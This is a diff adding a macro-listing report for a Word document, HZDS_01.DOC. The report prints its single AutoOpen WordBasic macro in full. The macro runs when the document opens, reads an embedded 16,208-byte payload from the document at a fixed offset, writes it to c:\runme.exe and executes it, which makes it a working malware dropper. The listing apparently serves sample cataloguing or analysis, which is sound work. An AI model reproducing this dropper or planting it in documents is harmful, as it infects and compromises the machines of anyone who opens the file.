@@ -1,0 +1,42 @@
+List Word Macros version 1.10
+File: HZDS_01.DOC
+Total macros: 1
+==============================================================================
+Macro name: AutoOpen [AUTOOPEN] "U"
+Description: AutoOpen
+------------------------------------------------------------------------------
+Declare Function CreateFileA Lib "kernel32"(c$ As String, a As Long, s As Long, r As Long, t As Long, f As Long, h As Long) As Long
+Declare Function ReadFile Lib "kernel32"(h As Long, B As Long, r As Long, d As String, o As Long) As Integer
+Declare Function WriteFile Lib "kernel32"(h As Long, B As Long, w As Long, n As String, o As Long) As Integer
+Declare Function SetFilePointer Lib "kernel32"(h As Long, d As Long, p As Long, M As Long) As Integer
+Declare Function CloseHandle Lib "kernel32"(h As Long) As Integer
+Declare Function GetProcessHeap Lib "kernel32" As Long
+Declare Function HeapAlloc Lib "kernel32"(h As Long, f As Long, c As Long) As Long
+Declare Function GetFileSize Lib "kernel32"(h As Long, l As Long) As Long
+Sub MAIN
+sto = 12301 + 32768 * 0
+cnt = 16208
+x = HeapAlloc(GetProcessHeap, 0, cnt)
+If x <> 0 Then
+src = O(FileName$(), 1)
+If src <> - 1 And GetFileSize(src, 0) Mod 512 <> 0 Then
+dest = O("c:\runme.exe", 0)
+If dest <> - 1 Then
+SetFilePointer(src, sto, 0, 0)
+ReadFile(src, x, cnt, retval$, 0)
+WriteFile(dest, x, cnt, retval$, 0)
+End If
+CloseHandle(dest)
+Shell "c:\runme.exe", 4
+End If
+CloseHandle(src)
+End If
+End Sub
+Function O(n$, m)
+GRW = - 1073741824
+If m = 1 Then GRW = - 2147483648
+If m = 0 Then OM = 2 Else OM = 3
+If m = 0 Then SH = 0 Else SH = 3
+O = CreateFileA(n$, GRW, SH, 0, OM, 0, 0)
+End Function
+==============================================================================
